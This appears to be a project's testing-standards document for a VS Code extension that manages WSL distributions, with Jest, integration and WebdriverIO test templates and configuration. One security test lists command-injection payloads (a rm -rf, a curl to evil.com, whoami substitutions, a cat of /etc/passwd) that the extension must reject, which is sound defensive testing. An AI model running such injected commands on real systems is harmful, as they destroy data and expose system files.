# Testing Standards and Documentation - VSC WSL Manager

## Overview
This document defines the testing standards for the VSC WSL Manager VS Code extension following Test-Driven Development (TDD) principles. All tests are written in TypeScript to maintain consistency with the codebase and ensure type safety throughout the development process.

## Core Principles
1. **Test First, Code Second**: Every feature starts with a failing test
2. **TypeScript Throughout**: All tests written in TypeScript for type safety
3. **AI-Friendly Testing**: Tests designed to be readable and writable by AI coding assistants
4. **Progressive Coverage**: Start with critical paths, expand to edge cases as discovered

## Testing Stack
- **Unit Tests:** Jest with TypeScript
- **Integration Tests:** VS Code Extension Testing API + Jest
- **E2E UI Tests:** WebdriverIO with TypeScript
- **Coverage Tracking:** nyc / c8
- **CI/CD:** GitHub Actions
- **Coverage Reporting:** Codecov / Coveralls

## Project Structure
```
vsc-wsl-manager/
├── src/                           # Source code
│   ├── extension.ts              # Extension entry point
│   ├── providers/                # Tree data providers
│   ├── commands/                 # Command implementations
│   ├── services/                 # WSL services
│   └── utils/                    # Utilities
├── test/                         # All test files
│   ├── unit/                     # Unit tests
│   │   ├── commands/            # Command tests
│   │   ├── services/            # Service tests
│   │   └── utils/               # Utility tests
│   ├── integration/              # Integration tests
│   │   ├── extension.test.ts    # Extension activation
│   │   └── providers/           # Provider tests
│   └── fixtures/                 # Test data
├── e2e/                          # WebdriverIO E2E tests
│   ├── specs/                    # E2E test specs
│   ├── pageobjects/             # Page object models
│   └── wdio.conf.ts             # WebdriverIO config
├── docs/
│   └── test-coverage/
│       ├── feature-coverage.md   # Feature coverage tracking
│       └── edge-cases.md        # Discovered edge cases
├── scripts/
│   ├── test-runner.ts           # Unified test runner
│   └── coverage-report.ts       # Coverage report generator
├── .github/
│   └── workflows/
│       └── tests.yml            # CI test workflow
├── jest.config.js                # Jest configuration
├── .nycrc.json                   # Coverage configuration
└── package.json                  # Scripts and dependencies
```

## Test-Driven Development Workflow

### 1. Feature Definition Phase
```typescript
// Step 1: Define the feature in feature-coverage.md
// Step 2: Write the test specification
// Step 3: Create failing test
// Step 4: Implement until test passes
// Step 5: Refactor with confidence
```

### 2. Writing Tests - TypeScript Templates

#### Unit Test Template
```typescript
/**
 * Feature: WSL_DISTRIBUTION_CREATION
 * Coverage Target: Distribution cloning functionality
 * Status: 🔴 Not Started | 🟡 In Progress | 🟢 Complete
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { WslService } from '../../src/services/wslService';
import { Distribution } from '../../src/types';

describe('WslService', () => {
    let wslService: WslService;
    let mockExecCommand: jest.Mock;

    beforeEach(() => {
        // Setup test fixtures
        wslService = new WslService();
        mockExecCommand = jest.fn();
        wslService['execCommand'] = mockExecCommand;
    });

    afterEach(() => {
        // Cleanup
        jest.clearAllMocks();
    });

    describe('cloneDistribution', () => {
        it('should clone an existing distribution', async () => {
            // Given
            const sourceDistro = 'Ubuntu-22.04';
            const targetDistro = 'Ubuntu-Project-1';
            const expectedCommand = `wsl --export ${sourceDistro} - | wsl --import ${targetDistro} ./distros/${targetDistro} -`;
            
            mockExecCommand.mockResolvedValueOnce({ 
                stdout: '', 
                stderr: '' 
            });

            // When
            const result = await wslService.cloneDistribution(
                sourceDistro, 
                targetDistro
            );

            // Then
            expect(mockExecCommand).toHaveBeenCalledWith(expectedCommand);
            expect(result).toEqual({
                success: true,
                distribution: targetDistro
            });
        });

        it('should handle edge case: source distribution not found', async () => {
            // Test implementation
        });

        it('should validate distribution names for security', async () => {
            // Test implementation - prevent command injection
        });
    });
});
```

#### Integration Test Template (VS Code Extension)
```typescript
/**
 * Feature: EXTENSION_ACTIVATION
 * Coverage Target: Extension activation and command registration
 */

import * as vscode from 'vscode';
import * as assert from 'assert';
import { beforeEach, afterEach } from 'mocha';

suite('Extension Integration Tests', () => {
    let context: vscode.ExtensionContext;

    beforeEach(async () => {
        // Activate the extension
        const extension = vscode.extensions.getExtension('your-publisher.vsc-wsl-manager');
        assert.ok(extension);
        await extension.activate();
    });

    test('should register all commands on activation', async () => {
        const commands = await vscode.commands.getCommands(true);
        
        // Verify critical commands are registered
        assert.ok(commands.includes('vsc-wsl-manager.refreshDistros'));
        assert.ok(commands.includes('vsc-wsl-manager.createDistro'));
        assert.ok(commands.includes('vsc-wsl-manager.deleteDistro'));
        assert.ok(commands.includes('vsc-wsl-manager.openTerminal'));
    });

    test('should display tree views in sidebar', async () => {
        // Check that tree data providers are registered
        const distroTree = vscode.window.createTreeView('wslDistributions', {
            treeDataProvider: new DistributionProvider()
        });
        
        assert.ok(distroTree.visible !== undefined);
    });

    test('should handle WSL not installed gracefully', async () => {
        // Test error handling when WSL is not available
    });
});
```

#### E2E Test Template (WebdriverIO)
```typescript
/**
 * Feature: DISTRO_MANAGEMENT_UI
 * Coverage: Complete user workflow for creating and managing distros
 * AI-Optimized: Clear selectors and assertions for AI tools
 */

import { browser, $, $$, expect } from '@wdio/globals';
import { VSCodeWorkbench } from '../pageobjects/workbench.page';
import { WslManagerSidebar } from '../pageobjects/wsl-sidebar.page';

describe('WSL Distribution Management E2E', () => {
    let workbench: VSCodeWorkbench;
    let wslSidebar: WslManagerSidebar;

    before(async () => {
        workbench = new VSCodeWorkbench();
        wslSidebar = new WslManagerSidebar();
        
        // Open VS Code with extension
        await workbench.open();
        await workbench.waitForExtensionActivation('vsc-wsl-manager');
    });

    it('should create a new distribution from template', async () => {
        // Open WSL Manager sidebar
        await workbench.openActivityBar('WSL Manager');
        
        // Click create distribution button
        await wslSidebar.clickCreateDistro();
        
        // Select template
        const quickPick = await workbench.getQuickPick();
        await quickPick.selectItem('Ubuntu-22.04');
        
        // Enter new distribution name
        await quickPick.setText('TestProject-Dev');
        await quickPick.confirm();
        
        // Wait for creation to complete
        await browser.waitUntil(
            async () => {
                const notifications = await workbench.getNotifications();
                return notifications.some(n => 
                    n.message.includes('Distribution created successfully')
                );
            },
            {
                timeout: 30000,
                timeoutMsg: 'Distribution creation did not complete'
            }
        );
        
        // Verify distribution appears in tree
        const distroItems = await wslSidebar.getDistributionItems();
        const testDistro = distroItems.find(d => d.label === 'TestProject-Dev');
        expect(testDistro).toBeDefined();
    });

    it('should open terminal for distribution', async () => {
        // Right-click on distribution
        await wslSidebar.rightClickDistribution('TestProject-Dev');
        
        // Select "Open Terminal"
        await workbench.selectContextMenuItem('Open Terminal');
        
        // Verify terminal opens with correct profile
        const terminal = await workbench.getActiveTerminal();
        expect(await terminal.getTitle()).toContain('TestProject-Dev');
    });

    // AI-friendly test with explicit waits and assertions
    it('should handle errors gracefully when creating duplicate distribution', async () => {
        // This test is designed to be easily modified by AI tools
        // Each step has clear intent and validation
        
        // Step 1: Attempt to create duplicate
        await wslSidebar.clickCreateDistro();
        
        // Step 2: Enter duplicate name
        const quickPick = await workbench.getQuickPick();
        await quickPick.setText('TestProject-Dev'); // Already exists
        await quickPick.confirm();
        
        // Step 3: Verify error notification
        await browser.waitUntil(
            async () => {
                const notifications = await workbench.getNotifications();
                return notifications.some(n => 
                    n.message.includes('already exists') &&
                    n.type === 'error'
                );
            }
        );
        
        // Step 4: Verify no duplicate in tree
        const distroItems = await wslSidebar.getDistributionItems();
        const duplicates = distroItems.filter(d => d.label === 'TestProject-Dev');
        expect(duplicates.length).toBe(1); // Only original exists
    });
});
```

## Feature Coverage Tracking

The feature coverage is tracked in `docs/test-coverage/feature-coverage.md`. See that file for the current status of all features and their test coverage.

## Unified Test Execution

### Test Runner Script
```typescript
// scripts/test-runner.ts
#!/usr/bin/env node

/**
 * Unified test runner ensuring consistency between local and CI execution.
 * This script is used both locally and in CI/CD workflows.
 */

import { Command } from 'commander';
import { spawn } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import chalk from 'chalk';

interface TestResults {
    type: string;
    passed: boolean;
    coverage?: number;
    duration: number;
}

class TestRunner {
    private results: TestResults[] = [];

    async runUnitTests(coverage: boolean = true): Promise<void> {
        console.log(chalk.blue('🧪 Running unit tests...'));
        
        const args = ['jest', 'test/unit'];
        if (coverage) {
            args.push('--coverage');
        }
        
        await this.executeCommand('npx', args);
    }

    async runIntegrationTests(): Promise<void> {
        console.log(chalk.blue('🔗 Running integration tests...'));
        
        // VS Code extension tests require special runner
        await this.executeCommand('npm', ['run', 'test:integration']);
    }

    async runE2ETests(): Promise<void> {
        console.log(chalk.blue('🌐 Running E2E tests...'));
        
        await this.executeCommand('npx', ['wdio', 'run', './e2e/wdio.conf.ts']);
    }

    async generateCoverageReport(threshold: number = 80): Promise<boolean> {
        console.log(chalk.blue('📊 Generating coverage report...'));
        
        const coverageFile = path.join(process.cwd(), 'coverage/coverage-summary.json');
        if (!fs.existsSync(coverageFile)) {
            console.log(chalk.yellow('No coverage data found'));
            return true;
        }

        const coverage = JSON.parse(fs.readFileSync(coverageFile, 'utf-8'));
        const totalCoverage = coverage.total.lines.pct;
        
        console.log(chalk.cyan(`Total Coverage: ${totalCoverage}%`));
        
        if (totalCoverage < threshold) {
            console.log(chalk.red(`❌ Coverage ${totalCoverage}% is below threshold ${threshold}%`));
            return false;
        }
        
        console.log(chalk.green(`✅ Coverage meets threshold`));
        return true;
    }

    private executeCommand(command: string, args: string[]): Promise<void> {
        return new Promise((resolve, reject) => {
            const process = spawn(command, args, { 
                stdio: 'inherit',
                shell: true 
            });
            
            process.on('close', (code) => {
                if (code === 0) {
                    resolve();
                } else {
                    reject(new Error(`Command failed with code ${code}`));
                }
            });
        });
    }
}

// CLI Interface
const program = new Command();

program
    .name('test-runner')
    .description('Unified test runner for VSC WSL Manager')
    .version('1.0.0');

program
    .option('-t, --type <type>', 'Test type (unit|integration|e2e|all)', 'all')
    .option('--no-coverage', 'Skip coverage reporting')
    .option('--threshold <number>', 'Coverage threshold', '80')
    .option('--ci', 'CI mode with stricter checks')
    .action(async (options) => {
        const runner = new TestRunner();
        let exitCode = 0;

        try {
            if (options.type === 'all' || options.type === 'unit') {
                await runner.runUnitTests(options.coverage);
            }
            
            if (options.type === 'all' || options.type === 'integration') {
                await runner.runIntegrationTests();
            }
            
            if (options.type === 'all' || options.type === 'e2e') {
                await runner.runE2ETests();
            }
            
            if (options.coverage) {
                const passed = await runner.generateCoverageReport(
                    parseInt(options.threshold)
                );
                if (!passed) exitCode = 1;
            }
        } catch (error) {
            console.error(chalk.red('Test execution failed:'), error);
            exitCode = 1;
        }

        process.exit(exitCode);
    });

program.parse();
```

## Configuration Files

### jest.config.js
```javascript
module.exports = {
    preset: 'ts-jest',
    testEnvironment: 'node',
    roots: ['<rootDir>/src', '<rootDir>/test'],
    testMatch: [
        '**/test/unit/**/*.test.ts',
        '**/test/integration/**/*.test.ts'
    ],
    collectCoverageFrom: [
        'src/**/*.ts',
        '!src/**/*.d.ts',
        '!src/test/**',
        '!src/extension.ts' // Tested via integration tests
    ],
    coverageDirectory: 'coverage',
    coverageReporters: ['text', 'lcov', 'html', 'json-summary'],
    coverageThreshold: {
        global: {
            branches: 80,
            functions: 80,
            lines: 80,
            statements: 80
        }
    },
    moduleNameMapper: {
        '^@/(.*)$': '<rootDir>/src/$1'
    },
    setupFilesAfterEnv: ['<rootDir>/test/setup.ts'],
    globals: {
        'ts-jest': {
            tsconfig: {
                esModuleInterop: true
            }
        }
    }
};
```

### wdio.conf.ts (WebdriverIO Config)
```typescript
import type { Options } from '@wdio/types';

export const config: Options.Testrunner = {
    runner: 'local',
    
    specs: [
        './e2e/specs/**/*.e2e.ts'
    ],
    
    exclude: [],
    
    maxInstances: 1, // VS Code testing should be sequential
    
    capabilities: [{
        browserName: 'vscode',
        browserVersion: 'stable', // or 'insiders'
        'wdio:vscodeOptions': {
            extensionPath: __dirname + '/../',
            userSettings: {
                'window.zoomLevel': 0
            }
        }
    }],
    
    logLevel: 'info',
    
    bail: 0,
    
    baseUrl: '',
    
    waitforTimeout: 10000,
    
    connectionRetryTimeout: 120000,
    
    connectionRetryCount: 3,
    
    services: ['vscode'],
    
    framework: 'mocha',
    
    reporters: [
        'spec',
        ['allure', {
            outputDir: 'e2e/allure-results',
            disableWebdriverStepsReporting: true,
            disableWebdriverScreenshotsReporting: false,
        }]
    ],
    
    mochaOpts: {
        ui: 'bdd',
        timeout: 60000,
        require: ['ts-node/register']
    },
    
    // Hooks for VS Code specific setup
    before: async function() {
        // Setup VS Code workspace
        await browser.executeWorkbench(async (vscode) => {
            // Clear previous state
            await vscode.commands.executeCommand('workbench.action.closeAllEditors');
        });
    },
    
    afterTest: async function(test, context, { error, result, duration, passed, retries }) {
        if (!passed) {
            // Take screenshot on failure
            await browser.takeScreenshot();
        }
    }
};
```

## CI/CD Integration

The GitHub Actions workflow is configured to use the same test runner script, ensuring consistency between local and CI environments. See `.github/workflows/tests.yml`.

## Test Patterns and Best Practices

### 1. AI-Friendly Test Writing
```typescript
// Clear, descriptive test names that AI can understand
it('should create a new WSL distribution when user clicks create button and enters valid name', async () => {
    // Step-by-step with clear intent
    // Each assertion is explicit
    // Comments explain business logic
});
```

### 2. Page Object Model for E2E Tests
```typescript
// e2e/pageobjects/wsl-sidebar.page.ts
export class WslManagerSidebar {
    get createButton() { return $('[data-testid="wsl-create-distro"]'); }
    get distroList() { return $$('[data-testid="wsl-distro-item"]'); }
    
    async clickCreateDistro(): Promise<void> {
        await this.createButton.click();
    }
    
    async getDistributionItems(): Promise<Array<{label: string, status: string}>> {
        // Implementation
    }
}
```

### 3. Test Data Builders
```typescript
// test/fixtures/builders.ts
export class DistributionBuilder {
    private distro: Partial<Distribution> = {
        name: 'Ubuntu-22.04',
        state: 'Running',
        version: 2
    };
    
    withName(name: string): this {
        this.distro.name = name;
        return this;
    }
    
    withState(state: string): this {
        this.distro.state = state;
        return this;
    }
    
    build(): Distribution {
        return this.distro as Distribution;
    }
}

// Usage in tests
const testDistro = new DistributionBuilder()
    .withName('TestDistro')
    .withState('Stopped')
    .build();
```

### 4. Security-Focused Testing
```typescript
describe('Security Tests', () => {
    it('should sanitize distribution names to prevent command injection', async () => {
        const maliciousNames = [
            'test; rm -rf /',
            'test && curl evil.com',
            'test`whoami`',
            'test$(whoami)',
            'test | cat /etc/passwd'
        ];
        
        for (const name of maliciousNames) {
            await expect(
                wslService.createDistribution(name)
            ).rejects.toThrow('Invalid distribution name');
        }
    });
});
```

## Contributing Tests

### For Contributors
1. Check `docs/test-coverage/feature-coverage.md` for gaps
2. Pick a feature marked as 🔴 (Not Started) or 🟡 (In Progress)
3. Write tests following TDD:
   - Write failing test first
   - Implement minimal code to pass
   - Refactor with confidence
4. Run tests locally: `npm run test:runner`
5. Update feature coverage table
6. Submit PR with test results

### Review Checklist
- [ ] Tests follow TypeScript conventions
- [ ] Tests have clear, descriptive names
- [ ] Tests are isolated and don't depend on order
- [ ] Tests include both happy path and edge cases
- [ ] Coverage meets minimum threshold
- [ ] Feature coverage table is updated
- [ ] AI tools can understand and modify tests

## Quick Commands

```bash
# Run all tests with coverage
npm run test

# Run specific test type
npm run test:unit
npm run test:integration
npm run test:e2e

# Run tests in watch mode (unit tests only)
npm run test:watch

# Run single test file
npm run test -- test/unit/services/wslService.test.ts

# Run tests matching pattern
npm run test -- --testNamePattern="should create"

# Generate coverage report
npm run coverage

# Run E2E tests with specific spec
npm run wdio -- --spec ./e2e/specs/distro-creation.e2e.ts

# Update snapshots
npm run test -- -u
```

## Troubleshooting

### Common Issues

1. **VS Code Extension Tests Not Running**
   - Ensure you have the Extension Test Runner installed
   - Check that `vscode-test` is installed
   - Verify `engines.vscode` in package.json matches test version

2. **WebdriverIO Can't Find VS Code**
   - Install VS Code WebDriver service: `npm install -D @wdio/vscode-service`
   - Ensure VS Code is in PATH
   - Check `wdio.conf.ts` capabilities configuration

3. **Coverage Not Generated**
   - Run `npm run test -- --coverage`
   - Check that `collectCoverageFrom` in jest.config.js is correct
   - Ensure source files have `.ts` extension

## AI Tool Integration Notes

This testing framework is specifically designed to work well with AI coding assistants:

1. **Clear Test Structure**: Each test has obvious intent and expected outcomes
2. **Explicit Selectors**: E2E tests use data-testid attributes for reliable element selection
3. **Step-by-Step Comments**: Tests include comments explaining business logic
4. **Comprehensive Examples**: Multiple examples for each test type
5. **Error Messages**: Descriptive assertion messages that explain failures

AI tools like Claude Code, Aider, and others can:
- Generate new tests following these patterns
- Modify existing tests safely
- Add edge cases based on the established structure
- Update feature coverage tracking automatically
